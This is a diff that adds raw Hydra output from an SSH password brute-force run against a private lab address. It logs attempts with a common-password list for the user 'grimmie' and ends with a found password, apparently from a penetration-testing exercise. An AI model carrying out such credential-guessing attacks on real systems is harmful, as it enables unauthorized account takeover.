@@ -1,0 +1,30 @@
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-03 20:19:09
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1010 login tries (l:1/p:1010), ~253 tries per task
+[DATA] attacking ssh://192.168.114.218:22/
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "admin" - 1 of 1010 [child 0] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "123456" - 2 of 1010 [child 1] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "12345" - 3 of 1010 [child 2] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "123456789" - 4 of 1010 [child 3] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "password" - 5 of 1010 [child 0] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "iloveyou" - 6 of 1010 [child 3] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "princess" - 7 of 1010 [child 1] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "1234567" - 8 of 1010 [child 2] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "12345678" - 9 of 1010 [child 0] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "abc123" - 10 of 1010 [child 3] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "nicole" - 11 of 1010 [child 1] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "daniel" - 12 of 1010 [child 2] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "babygirl" - 13 of 1010 [child 0] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "monkey" - 14 of 1010 [child 3] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "lovely" - 15 of 1010 [child 1] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "jessica" - 16 of 1010 [child 2] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "654321" - 17 of 1010 [child 0] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "michael" - 18 of 1010 [child 3] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "ashley" - 19 of 1010 [child 1] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "qwerty" - 20 of 1010 [child 2] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "My_V3ryS3cur3_P4ss" - 21 of 1010 [child 0] (0/0)
+[ATTEMPT] target 192.168.114.218 - login "grimmie" - pass "111111" - 22 of 1010 [child 3] (0/0)
+[22][ssh] host: 192.168.114.218   login: grimmie   password: My_V3ryS3cur3_P4ss
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-03 20:20:00
